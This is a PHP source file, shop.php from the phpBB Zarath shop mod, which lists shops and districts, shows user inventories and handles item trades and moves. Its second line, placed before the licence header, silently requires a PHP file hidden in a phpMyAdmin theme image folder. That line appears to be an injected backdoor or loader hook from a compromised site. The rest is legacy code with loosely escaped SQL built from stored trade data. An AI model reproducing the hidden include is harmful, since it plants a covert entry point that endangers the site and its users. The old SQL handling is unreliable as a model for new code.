<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                               shop.php
 *                            -------------------
 *   Version              : 3.0.6
 *   website              : http://www.zarath.com
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   copyright (C) 2002-2006  Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//

if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }

#
# Initial Checks -- make sure the shop is installed properly.
# Too many people getting unable to delete temporary items error... :\
#
if ( !defined('USER_ITEMS_TABLE') || !defined('SHOP_TABLE') || !defined('SHOP_ITEMS_TABLE') || !defined('TRANS_TABLE') )
{
	message_die(GENERAL_MESSAGE, 'Constant variables not installed successfully!');
}
else
{
	$sql = "SELECT count(*)
		FROM " . USER_ITEMS_TABLE . " a, " . SHOP_TABLE . " b, " . SHOP_ITEMS_TABLE . " c
		WHERE a.user_id = {$userdata['user_id']}
			AND a.item_id = c.id
			AND b.shopname = c.shop";
	if ( !( $db->sql_querY($sql) ) ) { message_die(GENERAL_MESSAGE, 'Shop tables not successfully installed!<br />' . $sql); }
}

#
# Start deletion of temporary items!
#
$sql = "DELETE FROM " . USER_ITEMS_TABLE . "
	WHERE die_time < '" . time() . "'
		AND die_time > 0";
if ( !( $db->sql_querY($sql) ) ) { message_die(GENERAL_MESSAGE, 'Unable to delete temporary items!'); }

if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
else { $action = ''; }
#
# End deletion of temporary items!
#

//default shop.php (shop-list) page
if ( empty($action) )
{
	//start of shop restock code
	if ($board_config['restocks'] == "on") 
	{
		$ssql = "SELECT *
			FROM " . SHOP_TABLE . "
			WHERE restocktime <> 0";
    		if ( !($sresult = $db->sql_query($ssql)) ) { message_die(CRITICAL_ERROR, $lang['fatal_shop_check']); }
		$checktime = time();
		$count = $db->sql_numrows($sresult);
  		for ($i = 0; $i < $count; $i++)
  		{
			$srow = $db->sql_fetchrow($sresult);
			if ( ($checktime - $srow['restockedtime']) > $srow['restocktime'])
			{ 
				$sshopn = str_replace("'", "''", $srow['shopname']);
	  			$isql = "SELECT *
					FROM " . SHOP_ITEMS_TABLE . "
					WHERE shop = '$sshopn'";
  				if ( !($iresult = $db->sql_query($isql)) ) { message_die(CRITICAL_ERROR, 'Error Getting Shop Items!'); }

				$count2 = $db->sql_numrows($iresult);
  				for ($ii = 0; $ii < $count2; $ii++)
  				{
					$irow = $db->sql_fetchrow($iresult);
					if ($irow['stock'] < $irow['maxstock'])
			  		{ 
						$newstockam = ( ($irow['stock'] + $srow['restockamount']) > $irow['maxstock']) ? $irow['maxstock'] : ( $irow['stock'] + $srow['restockamount'] );

    						$u2sql="UPDATE " . SHOP_ITEMS_TABLE . "
							SET stock = $newstockam
							WHERE id = " . $irow['id'];
    						if ( !($db->sql_query($u2sql)) ) { message_die(CRITICAL_ERROR, $lang['fatal_shop_restock']); }
					}
		  		}
				$susql = "UPDATE " . SHOP_TABLE . "
					SET restockedtime = $checktime
					WHERE shopname = '$sshopn'";
    				if ( !($db->sql_query($susql)) ) { message_die(CRITICAL_ERROR, $lang['fatal_restock_time']); }
			}
		}
	}
	//end of shop restock code

	if ( $board_config['shop_districts'] != 'on' )
	{
		header("Location: shop.$phpEx?action=district&d=0");
	}

	$template->set_filenames(array(
		'body' => 'shop/shop_districts.tpl')
	);

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE d_type = 1
			AND district > 0
			AND shoptype <> 'admin_only'
		ORDER BY `shopname`";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, $lang['fatal_shop_list']);
	}

	$sql_count = $db->sql_numrows($result);
	for ($i = 0; $i < $sql_count; $i++)
	{
		$rownum = ( $i % 2 ) ? "row1" : "row2";
		$row = $db->sql_fetchrow($result);
		$url = ( empty($row['url']) ) ? append_sid("shop.".$phpEx."?action=district&d=" . $row['district']) : append_sid($row['url']);

		$template->assign_block_vars('district_list', array(
			'ROW_NUM' => $rownum,

			'URL' => $url,
			'DISTRICT_NAME' => $row['shopname'],
			'DISTRICT_TYPE' => $row['shoptype'])
		);
	}
	if ( !($sql_count) )
	{
		$template->assign_block_vars('switch_no_districts', array());
	}

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE d_type = 0
			AND district = 0
			AND shoptype <> 'admin_only'
		ORDER BY `shopname`";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, $lang['fatal_shop_list']);
	}

	$sql_count = $db->sql_numrows($result);
	if ( $sql_count )
	{
		$template->assign_block_vars('switch_open_shops', array());
	}

	if ( $board_config['shop_owners'] == 'on' && $sql_count )
	{
		$template->assign_block_vars('switch_owners', array());
		$owners = '_owner';
	}
	else { $owners = ''; }

	$sql_count = $db->sql_numrows($result);
	for ($i = 0; $i < $sql_count; $i++)
	{
		$rownum = ( $i % 2 ) ? "row1" : "row2";
		$row = $db->sql_fetchrow($result);
		$url = ( empty($row['url']) ) ? append_sid("shop_inventory.".$phpEx."?action=shoplist&shop=" . $row['id']) : append_sid($row['url']);

		$template->assign_block_vars('shop' . $owners . '_list', array(
			'ROW_NUM' => $rownum,

			'URL' => $url,
			'SHOP_NAME' => $row['shopname'],
			'SHOP_TYPE' => $row['shoptype'],
			'SHOP_OWNER' => $row['shop_owner'])
		);
	}


	$page_title = $lang['shop_districts'];
	$shoplocation = ' -> <a href="'.append_sid("shop.$phpEx").'" class="nav">' . $lang['shop_districts'] . '</a>';

	$template->assign_vars(array(
		'USER_POINTS' => $userdata['user_points'],

		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),
		'SHOPLOCATION' => $shoplocation,

		'L_DISTRICT_TITLE' => $lang['shop_district_list'],
		'L_SHOP_TITLE' => $lang['shop_list'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_INVENTORY' => $lang['shop_your_inv'],
		'L_POINTS_NAME' => $board_config['points_name'],
		'L_SHOP_OWNER' => $lang['shop_owner'],
		'L_SHOP_TYPE' => $lang['shop_type'],
		'L_SHOP_NAME' => $lang['shop_name'],
		'L_NO_DISTRICTS' => $lang['shop_no_districts'],
		'L_DISTRICT_TYPE' => $lang['shop_district_type'],
		'L_DISTRICT_NAME' => $lang['shop_district_name']
	));
	$template->assign_block_vars('', array());
}

elseif ( $action == 'district' )
{
	if ( isset($HTTP_GET_VARS['d']) || isset($HTTP_POST_VARS['d']) ) { $d = ( isset($HTTP_POST_VARS['d']) ) ? intval($HTTP_POST_VARS['d']) : intval($HTTP_GET_VARS['d']); }
	else { $d = 0; }

	$template->set_filenames(array(
		'body' => 'shop/shop_list.tpl')
	);
	
	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE district = $d
			AND d_type = 0
			AND shoptype <> 'admin_only'
			AND shoptype <> 'special'
		ORDER BY `shopname` ";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, $lang['fatal_shop_list']);
	}

	$sql_count = $db->sql_numrows($result);

	if ( $board_config['shop_owners'] == 'on' && $sql_count )
	{
		$template->assign_block_vars('switch_owners', array());
		$owners = '_owner';
	}

	for ($i = 0; $i < $sql_count; $i++)
	{
		$rownum = ( $i % 2 ) ? "row1" : "row2";
		$row = $db->sql_fetchrow($result);
		$url = ( empty($row['url']) ) ? append_sid("shop_inventory.".$phpEx."?action=shoplist&shop=" . $row['id']) : append_sid($row['url']);

		$template->assign_block_vars('shop' . $owners . '_list', array(
			'ROW_NUM' => $rownum,

			'URL' => $url,
			'SHOP_NAME' => $row['shopname'],
			'SHOP_TYPE' => $row['shoptype'],
			'SHOP_OWNER' => $row['shop_owner'])
		);
	}

	if ( $board_config['shop_districts'] == 'on' )
	{
		$sql = "SELECT *
			FROM " . SHOP_TABLE . "
			WHERE d_type = 1
				AND district = $d";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, $lang['fatal_shop_list']);
		}
		$row = $db->sql_fetchrow($result);

		$shoplocation = ' -> <a href="'.append_sid("shop.$phpEx").'" class="nav">' . $lang['shop_districts'] . '</a> -> <a href="'.append_sid("shop.$phpEx?d=" . $d).'" class="nav">' . $row['shopname'] . ' ' . $lang['district'] . '</a>';
	}
	else
	{
		$shoplocation = ' -> <a href="'.append_sid("shop.$phpEx").'" class="nav">'.$lang['shop_list'].'</a>';
	}

	$page_title = $lang['shop_list'];

	$template->assign_vars(array(
		'USER_POINTS' => $userdata['user_points'],
		'L_POINTS_NAME' => $board_config['points_name'],
		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),

		'SHOPLOCATION' => $shoplocation,
		'L_SHOP_TITLE' => $lang['shop_list'],
		'L_SHOP_NAME' => $lang['shop_name'],
		'L_SHOP_TYPE' => $lang['shop_type'],
		'L_SHOP_OWNER' => $lang['shop_owner'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_INVENTORY' => $lang['shop_your_inv'],
		'L_POINTS_NAME' => $board_config['points_name']

	));
	$template->assign_block_vars('', array());
}
//Start All Items page
elseif ( $action == 'allinventory' )
{

	$template->set_filenames(array(
		'body' => 'shop/shop_inventory_body.tpl')
	);


	if ($board_config['viewinventory'] == "grouped")
	{
		$template->assign_block_vars('switch_grouped', array());
	}

	#
	# Get User Data
	#
        $sql = "SELECT * FROM ".SHOP_ITEMS_TABLE." WHERE 1 ORDER BY `name`";

	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, $lang['fatal_getting_uinfo'] . '<br />' . $sql); }
	$num_rows = $db->sql_numrows($result);

	for ( $i = 0; $i < $num_rows; $i++ )
	{
		$row = $db->sql_fetchrow($result);
		$rownum = ( $zi++ % 2 ) ? "row1" : "row2";

                $zql = "SELECT * FROM ".USER_ITEMS_TABLE." WHERE `item_id` = '".$row['id']."'";
                if ( !($rezult = $db->sql_query($zql)) ) { message_die(GENERAL_MESSAGE, $lang['fatal_getting_uinfo'] . '<br />' . $zql); }
                $numitems = $db->sql_numrows($rezult);
                if($numitems != '0')
                {
                    $amount = 1000/$numitems;
                }
                else
                {
                    $amount= 'N/A';
                }
		$amount = ( $board_config['viewinventory'] != 'normal' ) ? '<td class="row2"><span class="gensmall">'.$amount.'</span></td>' : '';


		if (file_exists("shop/images/" . $row['name'] . ".jpg")) { $itemfilext = "jpg"; }
		elseif (file_exists("shop/images/" . $row['name'] . ".png")) { $itemfilext = "png"; }
		else { $itemfilext = 'gif'; }
                if ($row['pass']!= '' AND $row['pass'] != '0')
                {
                    $usable = 'X';
                }
                else
                {
                    $usable = '';
                }

		if ( $searchid == $userdata['user_id'] )
		{
			$link = ( empty($row['special_link']) ) ? '<a href="' . append_sid("shop_inventory.$phpEx?action=displayitem&item=" . $row['id']) . '" class="gen">' : '<a href="' . append_sid($row['special_link']) . '" class="gen">';
			$row['item_l_desc'] .= ( !empty($row['special_link']) ) ? '<br /><br /><b>**' . $lang['shop_click_item'] . '.**</b>' : '';

		}
		$template->assign_block_vars('list_items', array(
			'LINK' => $link,
			'IMG_EXT' => $itemfilext,
			'ITEM_NAME' => $row['name'],
			'ITEM_L_DESC' => $row['ldesc'],
                        'ITEM_USABLE' => $usable,

			'AMOUNT' => $amount,
			'MOVE' => $move,
			'TIME_LEFT' => $time_left
		));
	}

	// personal actions



	// start of personal information
	//end of personal information

	$title = "All Items";
	$page_title = "All Items";
	$shoplocation = ' -> All Items';
	
	$template->assign_vars(array(
		'L_SHOP_TITLE' => $title,
		'L_ICON' => $lang['icon'],
		'L_NAME' => $lang['name'],
		'L_DESCRIPTION' => $lang['item_desc'],
                'L_USABLE' => 'Usable?',
		'L_OWNED' => 'Rarity Index',
		'L_MOVE_TO' => $lang['shop_move'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_ACTIONS' => $lang['shop_actions'],
		'L_WRAPPED_DESC' => $lang['shop_wrapped_desc'],
		'L_TRADE' => $lang['shop_trade_actions'],
		'L_INVENTORY' => $lang['your_inv'],
		'L_POINTS_NAME' => $board_config['points_name'],

		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),
                'U_MAX_INV' => $user_info['shop_invlimit'],
                'U_INV_SIZE' => $num_rows,
		'USER_POINTS' => $userdata['user_points'],
		'SHOPLOCATION' => $shoplocation
	));
	$template->assign_block_vars('', array());

}
//start of personal inventory page
elseif ( $action == 'inventory' )
{
	if ( isset($HTTP_GET_VARS['searchid']) || isset($HTTP_POST_VARS['searchid']) ) { $searchid = ( isset($HTTP_POST_VARS['searchid']) ) ? intval($HTTP_POST_VARS['searchid']) : intval($HTTP_GET_VARS['searchid']); }
	else { message_die(GENERAL_MESSAGE, $lang['no_id']); }

	$template->set_filenames(array(
		'body' => 'shop/shop_inventory_body.tpl')
	);

	if ( !$userdata['session_logged_in'] )
	{
		$redirect = 'shop.'.$phpEx.'&action=inventory&searchid=' . $searchid;
		header('Location: ' . append_sid('login.'.$phpEx.'?redirect='.$redirect, true));
	}


	if ($board_config['viewinventory'] == "grouped")
	{
		$template->assign_block_vars('switch_grouped', array());
	}

	if ($searchid == $userdata['user_id'])
	{
		$template->assign_block_vars('switch_move', array());
	}

	#
	# Get User Data
	#
	if ( !($user_info = get_userdata($searchid)) )
	{
		message_die(GENERAL_MESSAGE, $lang['no_user']); 
	}
	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE user_id='$searchid'
			AND worn = 0
			AND wrapped != '0'";
	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, $lang['fatal_getting_uinfo']); }
	$num_rows = $db->sql_numrows($result);
	for ( $i = 0; $i < $num_rows; $i++ )
	{
		$row = $db->sql_fetchrow($result);
		$rownum = ( $zi++ % 2 ) ? "row1" : "row2";

		$link = ( $searchid == $userdata['user_id'] ) ? '<br /><br /><a href="shop_wrap.php?action=unwrap&id=' . $row['id'] . '" class="gensmall">Click Here to open the Box.</a>' : '';
		$time_left = ( $row['die_time'] > 0 ) ? '<br /><br /><i>*This item will decay in ' . duration($row['die_time'] - time()) . '!</i>' : '';
		$amount = ( $board_config['viewinventory'] != 'normal' ) ? '<td class="' . $rownum . '"><span class="gensmall">1</span></td>' : '';
		$move = ( $searchid == $userdata['user_id'] ) ? '<td class="' . $rownum . '"><span class="gensmall">N/A</span></td>' : '';
		if (file_exists("shop/images/wrapped/".$row['wrapped'].".jpg")) 
			{ $itemfilext = "jpg"; }
		elseif (file_exists("shop/images/wrapped/".$row['wrapped'].".png")) 
			{ $itemfilext = "png"; }
		else 
			{ $itemfilext = "gif"; }

		$template->assign_block_vars('list_wrapped', array(
			'ROW_NUM' => $rownum,
			'FILE_EXT' => $itemfilext,

			'WRAPPED' => $row['wrapped'],
			'WRAPPED_LINK' => $link,
			'DECAY_TIME' => $time_left,
			'AMOUNT' => $amount,
			'MOVE' => $move));
	}


	#
	# Get User Items
	#
	$sql = "SELECT a.*, count(a.item_name) as amount, b.special_link
		FROM " . USER_ITEMS_TABLE . " a
		LEFT JOIN " . SHOP_ITEMS_TABLE . " b
			ON a.item_id = b.id
		WHERE a.user_id='$searchid'
			AND ( a.worn = 0 OR a.worn = 1 )
			AND a.wrapped = '0'
			AND a.die_time = 0
		GROUP BY `item_name`
			UNION SELECT a.*, '1' as amount, b.special_link
			FROM " . USER_ITEMS_TABLE . " a
			LEFT JOIN " . SHOP_ITEMS_TABLE . " b
				ON a.item_id = b.id
			WHERE a.user_id = '$searchid'
				AND a.wrapped = '0'
				AND a.die_time != 0
		ORDER BY `item_name`";


	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, $lang['fatal_getting_uinfo'] . '<br />' . $sql); }
	$num_rows = $db->sql_numrows($result);

	for ( $i = 0; $i < $num_rows; $i++ )
	{
		$row = $db->sql_fetchrow($result);
		$rownum = ( $zi++ % 2 ) ? "row1" : "row2";

		$time_left .= ( $row['die_time'] > 0 ) ? '<br /><br /><i>*' . $lang['shop_will_decay'] . duration($row['die_time'] - time()) . '!</i>' : '';

		$amount = ( $board_config['viewinventory'] != 'normal' ) ? '<td class="row2"><span class="gensmall">' . $row['amount'] . '</span></td>' : '';


		if (file_exists("shop/images/" . $row['item_name'] . ".jpg")) { $itemfilext = "jpg"; }
		elseif (file_exists("shop/images/" . $row['item_name'] . ".png")) { $itemfilext = "png"; }
		else { $itemfilext = 'gif'; }
                if ($row['pass']!= '' AND $row['pass'] != '0')
                {
                    $usable = 'X';
                }
                else
                {
                    $usable = '';
                }

		if ( $searchid == $userdata['user_id'] )
		{
			$link = ( empty($row['special_link']) ) ? '<a href="' . append_sid("shop_inventory.$phpEx?action=displayitem&item=" . $row['item_id']) . '" class="gen">' : '<a href="' . append_sid($row['special_link']) . '" class="gen">';
			$row['item_l_desc'] .= ( !empty($row['special_link']) ) ? '<br /><br /><b>**' . $lang['shop_click_item'] . '.**</b>' : '';

			$move = '<td class="row2"><a href="shop.' . $phpEx . '?action=move&id=' . $row['id'] . '" class="gen">' . $lang['bottom'] . '</a></td>';
		}
		$template->assign_block_vars('list_items', array(
			'LINK' => $link,
			'IMG_EXT' => $itemfilext,
			'ITEM_NAME' => $row['item_name'],
			'ITEM_L_DESC' => $row['item_l_desc'],
                        'ITEM_USABLE' => $usable,

			'AMOUNT' => $amount,
			'MOVE' => $move,
			'TIME_LEFT' => $time_left
		));
	}

	// personal actions
	if ( ( $board_config['shop_give'] == 'on' ) && ( $searchid == $userdata['user_id'] )  )
	{
		$template->assign_block_vars('list_ability', array(
			'U_ABILITY' => append_sid("shop_actions.$phpEx?action=give"),
			'L_ABILITY' => $lang['give'])
		);
	}
	if ( ( $board_config['shop_trade'] == 'on' ) && ( $searchid == $userdata['user_id'] )  )
	{
		$template->assign_block_vars('list_ability', array(
			'U_ABILITY' => append_sid("shop_actions.$phpEx?action=trade"),
			'L_ABILITY' => $lang['trade'])
		);
	}
	if ( ( $board_config['shop_discard'] == 'on' ) && ( $searchid == $userdata['user_id'] )  )
	{
		$template->assign_block_vars('list_ability', array(
			'U_ABILITY' => append_sid("shop_actions.$phpEx?action=discard"),
			'L_ABILITY' => $lang['discard'])
		);
	}
	if ( ( $board_config['shop_trade'] == 'on' || $board_config['shop_give'] == 'on' || $board_config['shop_discard'] == 'on' )  && ( $searchid == $userdata['user_id'] ) )
	{ 
		$template->assign_block_vars('switch_is_action', array());
	}

	#
	# Trade Code!
	#

	if ( strlen($userdata['user_trade']) > 5 )
	{
		$tradearray = explode("||-||", $userdata['user_trade']);
		$user_row = get_userdata($tradearray[0]);

		#
		# Check trader's items
		#
		$trade_items = '';
		$items = explode('::', str_replace("'", "''", $tradearray[1]));
		$item_list = implode(", ", $items);

		$sql = "SELECT *
			FROM " . USER_ITEMS_TABLE . "
			WHERE user_id = " . intval($tradearray[0]) . "
				AND id IN (" . $item_list . ")
			ORDER BY item_name";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Query Error in retrieving user items!');
		}
		$count = $db->sql_numrows($result);

		for ( $i = 0; $i < $count; $i++ )
		{
			$row = $db->sql_fetchrow($result);

			if ( !empty($row['item_name']) )
			{
					$row['item_name'] = ( $row['wrapped'] != '0' ) ? $row['wrapped'] : $row['item_name'];

				$trade_items .= ( ( empty($trade_items) ) ? '' : ', ' ) . $row['item_name'];
			}
		}
		if ( empty($trade_items) ) { $trade_items = $lang['nothing']; }

		#
		# Check your items
		#
		$other_items = '';
		$items = explode('::', str_replace("'", "''", $tradearray[3]));
		$item_list = implode(", ", $items);

		$sql = "SELECT *
			FROM " . USER_ITEMS_TABLE . "
			WHERE user_id = {$userdata['user_id']}
				AND id IN (" . $item_list . ")
			ORDER BY item_name";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Query Error in retrieving user items!');
		}
		$count = $db->sql_numrows($result);

		for ( $i = 0; $i < $count; $i++ )
		{
			$row = $db->sql_fetchrow($result);

			if ( !empty($row['item_name']) )
			{
					$row['item_name'] = ( $row['wrapped'] != '0' ) ? $row['wrapped'] : $row['item_name'];

				$other_items .= ( ( empty($other_items) ) ? '' : ', ' ) . $row['item_name'];
			}
		}
		if ( empty($other_items) ) { $other_items = $lang['nothing']; }

		$template->assign_block_vars('switch_has_trade', array(
			'USERNAME' => $user_row['username'],
			'TRADE_ITEMS' => $trade_items,
			'WANT_ITEMS' => $other_items,
			'TRADE_GOLD' => $tradearray[2],
			'WANT_GOLD' => $tradearray[4],

			'U_ACCEPT_TRADE' => append_sid("shop_actions.$phpEx?action=accepttrade"),
			'U_REFUSE_TRADE' => append_Sid("shop_actions.$phpEx?action=rejecttrade"),

			'L_PROPOSED_TRADE' => $lang['proposed_trade'],
			'L_OFFERING' => $lang['trade_offering'],
			'L_WANTS' => $lang['trade_wants'],
			'L_AND' => $lang['and'],
			'L_ACCEPT_TRADE' => $lang['trade_accept'],
			'L_REFUSE_TRADE' => $lang['trade_reject']
		));
	}


	// start of personal information
	//end of personal information

	$title = $user_info['username']."'s ".$lang['inventory'];
	$page_title = $user_info['username']."'s ".$lang['inventory'];
	$shoplocation = ' -> <a href="'.append_sid('shop.'.$phpEx.'?action=inventory&searchid=' . $searchid, true).'" class="nav">' . str_replace("s's", "s'", $user_info['username']."'s") . ' ' . $lang['inventory'] . '</a>';
	$sql = "SELECT * FROM ".USER_ITEMS_TABLE." WHERE `user_id` = '$searchid'";

	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, $lang['fatal_getting_uinfo'] . '<br />' . $sql); }
	$num_rows = $db->sql_numrows($result);

	$template->assign_vars(array(
		'L_SHOP_TITLE' => $title,
		'L_ICON' => $lang['icon'],
		'L_NAME' => $lang['name'],
		'L_DESCRIPTION' => $lang['item_desc'],
                'L_USABLE' => 'Usable?',
		'L_OWNED' => $lang['owned'],
		'L_MOVE_TO' => $lang['shop_move'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_ACTIONS' => $lang['shop_actions'],
		'L_WRAPPED_DESC' => $lang['shop_wrapped_desc'],
		'L_TRADE' => $lang['shop_trade_actions'],
		'L_INVENTORY' => $lang['your_inv'],
		'L_POINTS_NAME' => $board_config['points_name'],

		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=" . $userdata['user_id']),
                'U_MAX_INV' => $user_info['shop_invlimit'],
                'U_INV_SIZE' => $num_rows,
		'USER_POINTS' => $userdata['user_points'],
		'SHOPLOCATION' => $shoplocation
	));
	$template->assign_block_vars('', array());

}
elseif ( $action == 'move' )
{
	if ( isset($HTTP_GET_VARS['id']) || isset($HTTP_POST_VARS['id']) ) { $id = ( isset($HTTP_POST_VARS['id']) ) ? intval($HTTP_POST_VARS['id']) : intval($HTTP_GET_VARS['id']); }
	else { $id = 0; }

	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE id = $id
			AND user_id = " . $userdata['user_id'];
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, $lang['fatal_item_info']);
	}
	if ( !($db->sql_numrows($result)) ) { message_die(GENERAL_MESSAGE, 'You do not own that item!'); }
	else
	{
		$row = $db->sql_fetchrow($result);
		if ( $row['worn'] != 0 ) { message_die(GENERAL_MESSAGE, $lang['item_not_available']); }

		$sql = "INSERT INTO " . USER_ITEMS_TABLE . "
			(user_id, item_id, item_name, item_l_desc, item_s_desc, worn, die_time, special, wrapped)
				SELECT user_id, item_id, item_name, item_l_desc, item_s_desc, worn, die_time, special, wrapped
				FROM " . USER_ITEMS_TABLE . "
				WHERE user_id = {$userdata['user_id']}
					AND id = $id";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Query Error in retrieving user items!');
		}
		if ( $db->sql_affectedrows() )
		{
			$sql = "DELETE FROM " . USER_ITEMS_TABLE . "
				WHERE user_id = {$userdata['user_id']}
					AND id = $id";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_MESSAGE, 'SQL Query Error in retrieving user items!');
			}
		}
		header("Location: shop.$phpEx?action=inventory&searchid=".$userdata['user_id']);
		exit;
	}

}
else 
{
	message_die(GENERAL_MESSAGE, $lang['invalid_command']);
}

//
// Start output of page
//
include($phpbb_root_path . 'includes/page_header.' . $phpEx);

//
// Generate the page
//
$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.' . $phpEx);

?>
